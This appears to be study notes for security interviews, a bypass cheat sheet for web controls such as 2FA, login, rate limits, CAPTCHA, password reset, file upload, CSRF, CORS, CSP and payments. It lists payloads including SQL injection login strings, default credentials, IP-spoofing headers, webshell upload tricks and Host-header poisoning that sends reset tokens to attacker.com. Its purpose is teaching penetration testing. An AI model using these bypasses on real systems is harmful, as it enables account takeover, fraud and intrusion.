# Bypass Everything — Complete Action Bypass Guide

> Every security check is a gate. Your job is to find every way around it.

---

## Table of Contents

1. [OTP / 2FA Bypass](#1-otp--2fa-bypass)
2. [Login / Authentication Bypass](#2-login--authentication-bypass)
3. [Rate Limiting Bypass](#3-rate-limiting-bypass)
4. [CAPTCHA Bypass](#4-captcha-bypass)
5. [Email Verification Bypass](#5-email-verification-bypass)
6. [Password Reset Bypass](#6-password-reset-bypass)
7. [Access Control / Authorization Bypass](#7-access-control--authorization-bypass)
8. [File Upload Restriction Bypass](#8-file-upload-restriction-bypass)
9. [Input Validation Bypass](#9-input-validation-bypass)
10. [WAF Bypass](#10-waf-bypass)
11. [Payment / Business Logic Bypass](#11-payment--business-logic-bypass)
12. [Registration Restriction Bypass](#12-registration-restriction-bypass)
13. [Session / Token Bypass](#13-session--token-bypass)
14. [CSRF Protection Bypass](#14-csrf-protection-bypass)
15. [CORS Restriction Bypass](#15-cors-restriction-bypass)
16. [CSP (Content Security Policy) Bypass](#16-csp-bypass)
17. [IP Restriction Bypass](#17-ip-restriction-bypass)
18. [Feature Lock / Premium Bypass](#18-feature-lock--premium-bypass)

---

## 1. OTP / 2FA Bypass

The server sends a code to your phone/email. You need to enter it to proceed.
Here is every way to bypass it:

### Method 1: Skip the OTP Page Entirely

**What to do:** After entering username/password, instead of going to the OTP page, directly navigate to the dashboard or home page URL.

**How it works:**
```
Normal flow:  /login → /verify-otp → /dashboard
Your test:    /login → /dashboard (skip the middle step)
```

**Why it works:** Some apps check OTP on the OTP page only. If you never visit that page and go straight to the next step, the server might not enforce the check.

**Simple words:** Imagine a door with two locks. You pick the first lock (password), then instead of picking the second lock (OTP), you climb through the window (direct URL).

---

### Method 2: Response Manipulation

**What to do:** Enter any wrong OTP. Intercept the server response in Burp Suite. Change the response from "false" to "true" or from "error" to "success".

**How it works:**
```
You send:     POST /verify-otp  code=123456
Server says:  {"success": false, "message": "Invalid OTP"}
You change:   {"success": true, "message": "Valid OTP"}
```

**Why it works:** Some apps rely on the response to decide what page to show. The client-side JavaScript reads the response and either shows an error or redirects to dashboard. If you change the response, the JS thinks verification passed.

**Simple words:** The teacher says "wrong answer" but you erase it and write "correct" before anyone sees. If the school system trusts what is written on paper without double-checking, you pass.

---

### Method 3: Status Code Manipulation

**What to do:** Wrong OTP might return HTTP 401 or 403. Change the status code to 200 in Burp.

```
Original response:  HTTP/1.1 403 Forbidden
Changed to:         HTTP/1.1 200 OK
```

**Why it works:** Frontend JavaScript often checks status code, not response body. If status is 200, it proceeds.

---

### Method 4: Brute Force the OTP

**What to do:** OTP is usually 4 or 6 digits. Try all possible combinations.

```
4-digit OTP: 0000 to 9999 = 10,000 possibilities
6-digit OTP: 000000 to 999999 = 1,000,000 possibilities
```

**Check for:**
- Is there rate limiting? (how many attempts before blocked?)
- Does the OTP expire? (how long do you have?)
- Does the account lock after X attempts?

**If no rate limiting:** Burp Intruder with number payload 0000-9999. Even 10,000 requests takes only minutes.

---

### Method 5: Reuse Old OTP

**What to do:**
1. Request an OTP, receive code (e.g., 482951)
2. Use the code successfully
3. Log out
4. Log in again
5. Use the SAME old code 482951

**Why it might work:** Server might not invalidate old OTPs after use or after a new one is generated.

---

### Method 6: Use a Previous Session's OTP

**What to do:**
1. Log in as User A, get OTP, note it
2. Log out
3. Log in as User B
4. Enter User A's OTP

**Why it might work:** OTP might be tied to the session, not the user. Or the check might only verify "is this a valid OTP?" without checking "is this YOUR OTP?"

---

### Method 7: Null or Empty OTP

**What to do:** Send the OTP field as empty, null, or missing entirely.

```
Attempt 1: code=           (empty string)
Attempt 2: code=null
Attempt 3: code=0
Attempt 4: code=000000
Attempt 5: (remove the code parameter entirely)
Attempt 6: code[]=         (send as array)
```

**Why it might work:** Bad null handling in code. The check might be: "if code equals stored_code" — if both are null/empty, they match.

---

### Method 8: OTP in Response

**What to do:** When you request an OTP, check the server's response carefully.

Look in:
- Response body (sometimes in JSON or hidden HTML)
- Response headers
- Cookies

```
Response: {"message": "OTP sent", "otp": "482951"}
```

**Why it happens:** Developer left debug code in production, or the API was designed for mobile apps where the OTP is handled in-app.

---

### Method 9: Default or Hardcoded OTP

**What to do:** Try common default values:

```
000000, 111111, 123456, 654321, 999999
1234, 0000, 1111
```

**Why it might work:** Developers sometimes hardcode a "test OTP" during development and forget to remove it.

---

### Method 10: Token/Cookie Manipulation

**What to do:** After entering password (before OTP), check your cookies and local storage.

```
Look for: is_verified=false  →  change to: is_verified=true
Look for: otp_required=1     →  change to: otp_required=0
Look for: step=2             →  change to: step=3
Look for: auth_level=1       →  change to: auth_level=2
```

---

### Method 11: Bypass via Backup Codes

**What to do:** Instead of OTP, try using backup/recovery codes. These are sometimes:
- Less rate-limited than OTP
- Shorter (8 chars vs OTP complexity)
- Not properly invalidated after use

---

### Method 12: Bypass via Different Login Method

**What to do:** If the app supports multiple login methods:
- OAuth/Social login (Google, GitHub) might skip 2FA
- SSO login might skip 2FA
- Mobile API login might not enforce 2FA
- Older API version might not have 2FA

---

## 2. Login / Authentication Bypass

### Method 1: SQL Injection in Login

```
Username: admin' --
Password: anything

What happens: Query becomes SELECT * FROM users WHERE user='admin' -- ' AND pass='anything'
The password check is commented out.
```

### Method 2: Default Credentials

```
admin:admin       admin:password    admin:123456
root:root         root:toor         test:test
administrator:administrator
```

Check the technology stack and search for its default credentials.

### Method 3: Username Enumeration + Password Spray

```
Step 1: Find valid usernames
  - Different error for "user not found" vs "wrong password"
  - Different response time for valid vs invalid users
  - Registration form says "email already taken"

Step 2: Try common passwords against all valid usernames
  - password, Password1, CompanyName2024, Welcome1
  - Only 2-3 attempts per account (avoid lockout)
```

### Method 4: Password Reset → Login

If login is protected but password reset is not:
1. Reset the target user's password
2. Login with the new password
3. You bypassed the login protection indirectly

### Method 5: Token Manipulation

```
Check cookies after login attempt:
  loggedin=0        → change to loggedin=1
  role=guest        → change to role=user or role=admin
  authenticated=no  → change to authenticated=yes
```

### Method 6: HTTP Verb Change

```
POST /login returns 403?
Try: GET /login
Try: PUT /login
Try: PATCH /login
Some access controls only check specific HTTP methods.
```

---

## 3. Rate Limiting Bypass

Rate limiting stops you from sending too many requests. Here is how to bypass it:

### Method 1: IP Rotation via Headers

```
Add these headers and change the IP each request:
  X-Forwarded-For: 1.2.3.4
  X-Real-IP: 1.2.3.5
  X-Originating-IP: 1.2.3.6
  X-Client-IP: 1.2.3.7
  True-Client-IP: 1.2.3.8
  CF-Connecting-IP: 1.2.3.9
```

**Simple words:** The server thinks each request is from a different person.

### Method 2: Change Small Things Each Request

```
Add spaces:     admin@test.com   →   admin@test.com  (trailing space)
Change case:    admin@test.com   →   Admin@Test.com
Add plus:       admin@test.com   →   admin+1@test.com
Null byte:      admin@test.com   →   admin@test.com%00
Add dot:        admin@gmail.com  →   a.dmin@gmail.com (Gmail ignores dots)
```

**Why:** Rate limiter might count per unique input. Different input = different counter.

### Method 3: Change Endpoint

```
/api/v1/login  → rate limited
/api/v2/login  → not rate limited?
/api/Login     → case change
/api/login/    → trailing slash
/api/login/.   → dot
```

### Method 4: Slow Down

Instead of 100 requests/second, send 1 request every 2 seconds. Many rate limiters use a time window (e.g., 10 requests per minute). Stay just under the limit.

### Method 5: Distribute Across Parameters

```
Instead of brute forcing password on one account:
  Try password "Password1" on ALL accounts (password spray)
  1 attempt per account = no per-account rate limit triggered
```

---

## 4. CAPTCHA Bypass

### Method 1: Remove CAPTCHA Parameter

```
Normal request: username=admin&password=test&captcha=abc123
Test request:   username=admin&password=test
(remove captcha field entirely — does it still work?)
```

### Method 2: Send Empty CAPTCHA

```
captcha=
captcha=null
captcha=0
```

### Method 3: Reuse Old CAPTCHA

```
1. Solve CAPTCHA once, get the token
2. Use that same token in all subsequent requests
If it is not invalidated after use, it works forever.
```

### Method 4: Check if CAPTCHA is Validated Server-Side

```
1. Remove the CAPTCHA field from request
2. Send any random value
3. If server accepts → CAPTCHA is only checked on client-side
```

### Method 5: OCR / Third-Party Services

For image CAPTCHAs:
- Use OCR tools (Tesseract)
- Use CAPTCHA-solving services (2captcha, anti-captcha)
- For reCAPTCHA: check if the site key is misconfigured (test key)

### Method 6: CAPTCHA Appears Only After N Failures

```
If CAPTCHA shows after 3 failed attempts:
  - Make 2 attempts, then change IP (via headers)
  - CAPTCHA counter resets, you get 2 more attempts
  - Repeat indefinitely
```

---

## 5. Email Verification Bypass

### Method 1: Skip the Verification Step

```
Register → Email says "click to verify" → Instead, try to login directly
If the app lets you login without verifying → bypassed
```

### Method 2: Manipulate the Verification Token

```
Token: /verify?token=abc123&email=victim@test.com
Test:  /verify?token=abc123&email=YOUR@email.com
Does it verify YOUR account with someone else's token?
```

### Method 3: Response Manipulation

```
POST /check-verification
Response: {"verified": false}
Change to: {"verified": true}
```

### Method 4: Use API Endpoints Directly

```
Some APIs don't check email verification status:
  GET /api/profile      → works even if not verified
  POST /api/create-post → works even if not verified
Only the UI blocks you, not the API.
```

### Method 5: Mass Assignment

```
POST /register
{"email": "me@test.com", "password": "test", "email_verified": true}

Add the email_verified field yourself in the request.
```

### Method 6: Host Header Manipulation

```
POST /register HTTP/1.1
Host: attacker.com

If the verification email link uses the Host header:
  Link becomes: https://attacker.com/verify?token=abc123
  Token is sent to your server!
```

---

## 6. Password Reset Bypass

### Method 1: Reset Token for Wrong User

```
Step 1: Request password reset for YOUR email
Step 2: Receive the reset link with token
Step 3: Use that token but change the email/user_id parameter to victim

POST /reset-password
token=your_token&email=victim@test.com&new_password=hacked
```

### Method 2: Predictable Token

```
Tokens you receive: a3f9e2, a3f9e3, a3f9e4
Pattern: sequential! Guess the next one.

Or token = base64(email + timestamp)
Decode it, forge one for the victim.
```

### Method 3: Token Does Not Expire

```
1. Request reset
2. Wait 24 hours
3. Use the token
If it still works → token never expires → anyone who ever got the link can use it
```

### Method 4: Token Reuse

```
1. Use the reset token to change password
2. Use the SAME token again
If it works → token is not invalidated after use
```

### Method 5: Host Header Poisoning

```
POST /forgot-password HTTP/1.1
Host: attacker.com

Victim's reset email contains: https://attacker.com/reset?token=secret
When victim clicks → token goes to your server
```

### Method 6: Password Reset via API Without Token

```
Some APIs allow direct password change:
  PUT /api/users/5
  {"password": "new_password"}

No token needed, just IDOR the user ID.
```

### Method 7: Referer Leakage

```
Password reset page: https://app.com/reset?token=abc123
If this page loads external resources (images, scripts, analytics):
  The Referer header sent to those external servers contains the token!
```

---

## 7. Access Control / Authorization Bypass

### Method 1: Change the URL

```
/user/profile  → you see your profile
/admin/panel   → try directly, even if no link exists in UI
/api/admin/users → try admin API endpoints
```

### Method 2: Change the ID

```
/api/users/YOUR_ID     → your data
/api/users/OTHER_ID    → their data? (IDOR)
/api/users/1           → admin's data? (first user is often admin)
```

### Method 3: Change the Method

```
GET /api/users/5    → 200 OK (can read)
DELETE /api/users/5 → does it work? (should not for regular user)
PUT /api/users/5    → can you modify?
```

### Method 4: Parameter Tampering

```
POST /api/update-profile
{"name": "Test", "role": "admin"}

Add role, is_admin, permissions, or group fields.
Server might accept them (mass assignment).
```

### Method 5: Path Manipulation

```
/admin         → 403 Forbidden
/Admin         → 200? (case change)
/admin/        → 200? (trailing slash)
/./admin       → 200? (dot segment)
//admin        → 200? (double slash)
/admin..;/     → 200? (path traversal)
/%61dmin       → 200? (URL encode 'a')
```

### Method 6: Method Override Headers

```
POST /api/resource HTTP/1.1
X-HTTP-Method-Override: DELETE
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

---

## 8. File Upload Restriction Bypass

### Method 1: Extension Tricks

```
Blocked: .php
Try:     .php5  .phtml  .phar  .PHP  .pHp
         .php.jpg  .php;.jpg  .php%00.jpg
         .php.  (trailing dot, Windows)
```

### Method 2: Content-Type Change

```
Change Content-Type header: image/jpeg (even if file is PHP)
```

### Method 3: Magic Bytes

```
Add image file signature at the start of your file:
  GIF: GIF89a;
  JPEG: (binary FF D8 FF E0 bytes)
Then add your PHP code after it.
```

### Method 4: Double Extension

```
shell.jpg.php   → server might check .jpg (first) but execute .php (last)
shell.php.jpg   → server might check .jpg (last) but Apache might execute .php
```

### Method 5: Filename Parameter Manipulation

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Try:
  filename="shell.php "      (trailing space)
  filename="shell.php."      (trailing dot)
  filename="shell.php::$DATA"  (NTFS stream)
  filename="../shell.php"     (path traversal)
```

---

## 9. Input Validation Bypass

### Method 1: Client-Side Only

```
If validation is JavaScript in browser → bypass by:
  1. Disable JavaScript
  2. Intercept request in Burp and modify
  3. Use curl/Postman (no browser = no JS validation)
```

### Method 2: Encoding

```
Original:  malicious_input
URL encode: %6D%61%6C%69%63%69%6F%75%73
Double encode: %256D%2561%256C...
Unicode: \u006D\u0061\u006C...
HTML entities: &#109;&#97;&#108;...
```

### Method 3: Null Byte

```
file.php%00.jpg
The server might read "file.php%00.jpg" but the filesystem stops at %00 and creates "file.php"
```

### Method 4: Different Content-Type

```
Server validates form-urlencoded but not JSON?
Change Content-Type to application/json and send same data as JSON.
```

### Method 5: Array/Object Instead of String

```
Instead of: param=value
Try:        param[]=value
Or:         param[key]=value
Or JSON:    {"param": ["value1", "value2"]}
```

---

## 10. WAF Bypass

### Quick Reference

```
Keyword blocked:    Use case variation (sElEcT), comments (SEL/**/ECT), encoding
Quote blocked:      Use CHAR() function, hex values, double encoding
Space blocked:      Use comments (/**/), tabs (%09), newlines (%0a)
Tag blocked:        Use different tags (img, svg, details, body)
Function blocked:   Use alternatives (confirm instead of alert)
Entire payload:     Use chunked transfer encoding, HPP, content-type change
```

See file 08_waf_bypass_encyclopedia.md for full details.

---

## 11. Payment / Business Logic Bypass

### Method 1: Price Manipulation

```
Intercept the purchase request:
  {"item": "laptop", "price": 999.99}
Change to:
  {"item": "laptop", "price": 0.01}
  {"item": "laptop", "price": -1}     (negative = refund?)
  {"item": "laptop", "price": 0}
```

### Method 2: Quantity Manipulation

```
{"item": "laptop", "quantity": -1}    → negative quantity = credit?
{"item": "laptop", "quantity": 0}     → free item?
```

### Method 3: Coupon Abuse

```
1. Apply coupon code
2. Apply same coupon again → double discount?
3. Apply multiple different coupons → stacking?
4. Apply coupon that gives 100% discount
5. Apply coupon after payment step
```

### Method 4: Currency Confusion

```
{"price": 100, "currency": "USD"}
Change to:
{"price": 100, "currency": "INR"}  → pay in weaker currency
```

### Method 5: Race Condition

```
You have 100 credits balance.
Item costs 100 credits.
Send 10 purchase requests SIMULTANEOUSLY.
All 10 might check "balance >= 100" before any deduction happens.
Result: 10 items for the price of 1.
```

### Method 6: Skip Payment Step

```
Normal flow: Cart → Payment → Confirmation → Order Complete
Test:        Cart → Order Complete (skip payment)
Direct URL to order confirmation page with manipulated parameters.
```

---

## 12. Registration Restriction Bypass

### Method 1: Invite-Only Registration

```
If registration requires invite code:
  1. Try empty invite code
  2. Try common codes: test, invite, beta, admin
  3. Remove the invite_code parameter entirely
  4. Check if there is a public registration API endpoint
```

### Method 2: Domain Restriction

```
Only @company.com emails allowed?
Try: you+anything@company.com  (plus trick)
Try: you@company.com.attacker.com  (subdomain trick)
Try: you@Company.com  (case change)
```

### Method 3: Duplicate Account

```
Already registered email blocked?
Try: email with spaces, dots, plus signs
  admin@test.com  vs  admin@test.com  (trailing space)
  admin@test.com  vs  Admin@test.com  (case)
  admin@gmail.com vs  a.dmin@gmail.com  (dots in Gmail)
```

---

## 13. Session / Token Bypass

### Method 1: Session Fixation

```
1. Get a session ID (before login): SESSION=abc123
2. Send victim a link with that session: ?SESSION=abc123
3. Victim logs in using that session
4. You now use SESSION=abc123 → authenticated as victim
```

**Check:** Does the session ID change after login? If NO → vulnerable.

### Method 2: Predictable Session

```
Your session IDs over multiple logins:
  sess_001, sess_002, sess_003
Pattern: sequential! Guess other users' sessions.
```

### Method 3: Session Not Invalidated on Logout

```
1. Copy your session token
2. Click logout
3. Use the copied token in a new request
If it works → session is not destroyed server-side
```

### Method 4: Long-Lived Tokens

```
1. Get a session token
2. Wait 24 hours (or a week)
3. Try using it
If it works → no expiration → stolen token = permanent access
```

---

## 14. CSRF Protection Bypass

### Method 1: Remove CSRF Token

```
Normal: POST /change-email  csrf_token=abc123&email=new@test.com
Test:   POST /change-email  email=new@test.com  (remove token)
If it works → CSRF is not enforced, only present.
```

### Method 2: Empty Token

```
csrf_token=
csrf_token=null
csrf_token=0
```

### Method 3: Reuse Token

```
Use the same CSRF token across multiple requests.
If it works → token is not single-use.
```

### Method 4: Use Another User's Token

```
CSRF tokens should be tied to your session.
Get a token from Account A, use it in Account B's session.
If it works → tokens are not per-session.
```

### Method 5: Change Request Method

```
POST /change-email → has CSRF check
GET /change-email?email=new@test.com → no CSRF check?
```

### Method 6: Change Content-Type

```
CSRF check on application/x-www-form-urlencoded
But not on application/json?
Send the same data as JSON.
```

---

## 15. CORS Restriction Bypass

### Method 1: Null Origin

```
If server allows Origin: null
  → Use sandboxed iframe (sends null origin)
  → Data URL pages send null origin
```

### Method 2: Subdomain Wildcard

```
If server allows *.target.com
  → Find XSS on any subdomain (blog.target.com)
  → Use that XSS to make requests to main domain
```

### Method 3: Pre-Domain Wildcard

```
If server checks: does origin END with target.com?
  → attackertarget.com  matches!
If server checks: does origin CONTAIN target.com?
  → target.com.attacker.com  matches!
```

---

## 16. CSP Bypass

### Method 1: Find Allowed Domains

```
CSP allows scripts from cdn.example.com
If cdn.example.com hosts any user-uploaded JS → game over
If cdn.example.com has JSONP endpoints → use them to execute code
```

### Method 2: Unsafe-Inline

```
If CSP has 'unsafe-inline' → regular inline scripts work
```

### Method 3: Base-URI Missing

```
If CSP does not restrict base-uri:
  Inject <base href="https://attacker.com/">
  All relative script paths now load from attacker's server
```

---

## 17. IP Restriction Bypass

### Method 1: Header Spoofing

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### Method 2: IPv6

```
Blocked: 127.0.0.1
Try: ::1, 0:0:0:0:0:0:0:1, ::ffff:127.0.0.1
```

### Method 3: Alternative Representations

```
127.0.0.1 can be written as:
  2130706433    (decimal)
  0x7f000001    (hex)
  017700000001  (octal)
  127.1         (shortened)
  127.0.1       (shortened)
```

---

## 18. Feature Lock / Premium Bypass

### Method 1: API Direct Access

```
UI shows: "Upgrade to Premium to use this feature"
But API: GET /api/premium-feature → works without premium check?
```

### Method 2: Parameter Tampering

```
{"user_plan": "free"} → {"user_plan": "premium"}
{"is_pro": false}     → {"is_pro": true}
```

### Method 3: Cookie/LocalStorage

```
Check browser storage:
  plan=free            → change to plan=premium
  features=basic       → change to features=all
  trial_expired=true   → change to trial_expired=false
```

### Method 4: Client-Side Checks Only

```
If the premium check is in JavaScript:
  - The data is still sent from the server
  - JS just hides it in the UI
  - Look at Network tab → response might contain premium data
  - Remove the JS check or modify the DOM to reveal hidden features
```

---

## Master Bypass Mindset

Every bypass follows the same thinking pattern:

```
1. UNDERSTAND what the protection is doing
   → Is it checking on client or server?
   → What exactly is it checking? (value, existence, format)

2. TEST the boundaries
   → What if the check value is empty?
   → What if the check value is missing?
   → What if I use a different path to the same feature?
   → What if I change how I send the data? (method, encoding, format)

3. FIND the gap
   → The gap is always between what the developer ASSUMED 
     and what is ACTUALLY enforced
```

**The universal question:** "What happens if I just... don't do it?"
- What if I skip this step?
- What if I send nothing?
- What if I send the wrong thing?
- What if I go around instead of through?

---

> For each bypass above, practice explaining WHY it works, not just WHAT to do.
> In the manager round, they want to hear your THINKING, not your technique list.
